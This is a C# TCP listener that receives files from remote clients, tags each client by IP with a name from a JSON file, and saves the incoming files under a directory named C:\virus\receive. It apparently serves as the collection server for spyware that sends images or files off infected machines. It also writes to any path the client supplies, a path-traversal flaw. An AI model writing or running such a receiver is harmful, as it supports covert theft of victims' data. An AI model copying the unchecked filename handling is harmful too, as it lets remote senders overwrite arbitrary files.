using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace Server
{
    class Program
    {
        const int LISTENING_PORT = 10001;
        const string IMAGE_DIR = @"C:\virus\receive\";
        const int BUFFER_SIZE = 10240;
        static dynamic jsonArray;
        static string ipAddress = "";
        static string ipName = "";
        static bool ipEnable = true;
        static int clientCount = 0;

        static void Main(string[] args)
        {
            GetJsonData();
            string dir = IMAGE_DIR;
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            var listener = new TcpListener(IPAddress.Any, LISTENING_PORT);
            listener.Start();
            Console.WriteLine($"| Listening on port {LISTENING_PORT}...");
            Console.WriteLine("+---------------------------------------------");

            while (true)
            {
                var client = listener.AcceptTcpClient();
                ipAddress = client.Client.RemoteEndPoint.ToString().Remove(12).Replace(":", "");
                foreach (var item in jsonArray)
                {
                    //Console.WriteLine("{0} {1} {2}", item.ip, item.enable, item.name);
                    ipName = "Default";
                    ipEnable = true;
                    if (item.ip == ipAddress)
                    {
                        ipName = item.name;
                        ipEnable = item.enable;
                        break;
                    }
                }
                if (!ipEnable) continue;
                clientCount++;
                if (ipName == "Lovely")
                {
                    Console.WriteLine($"+--------------------------------------------- {clientCount} Client(s)");
                    clientCount = 0;
                }
                Console.Write($"[{ipAddress}] ");
                ThreadPool.QueueUserWorkItem(cb => ClientThread(client));
            }
        }
        static void GetJsonData()
        {
            //string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            //string sourceJsonPath = Path.Combine(currentPath, @"ipToName.json");
            using (StreamReader r = new StreamReader("ipToName.json"))
            {
                string json = r.ReadToEnd();
                jsonArray = JsonConvert.DeserializeObject(json);
                Console.WriteLine("+---------------------------------------------");
                foreach (var item in jsonArray)
                {
                    Console.WriteLine("| {0} {1} {2}", item.ip, item.enable, item.name);
                }
                Console.WriteLine("+---------------------------------------------");
            }
        }
        static void ClientThread(TcpClient client)
        {
            try
            {
                using (var stream = client.GetStream())
                {
                    string subdir = IMAGE_DIR+ipAddress+$"--{ipName}\\";
                    if (!Directory.Exists(subdir))
                    {
                        string[] lines = new string[] { subdir };
                        File.AppendAllLines(@"C:\tempInfo.json", lines);
                        Directory.CreateDirectory(subdir);
                    }
                    // Read filename length
                    int fNameLen = stream.ReadByte();
                    byte[] fNameBytes = new byte[fNameLen];
                    // Read filename
                    stream.Read(fNameBytes, 0, fNameLen);
                    string fName = Encoding.Unicode.GetString(fNameBytes);
                    Console.WriteLine($" {fName}  {ipName}");
                    using (var fs = File.OpenWrite(subdir + fName))
                    {
                        byte[] buffer = new byte[BUFFER_SIZE];
                        while (true)
                        {
                            int r = stream.Read(buffer, 0, BUFFER_SIZE);
                            if (r == 0)
                                break;
                            fs.Write(buffer, 0, r);
                        }
                    }
                }
            }
            finally
            {
                client.Close();
            }
        }
    }
}
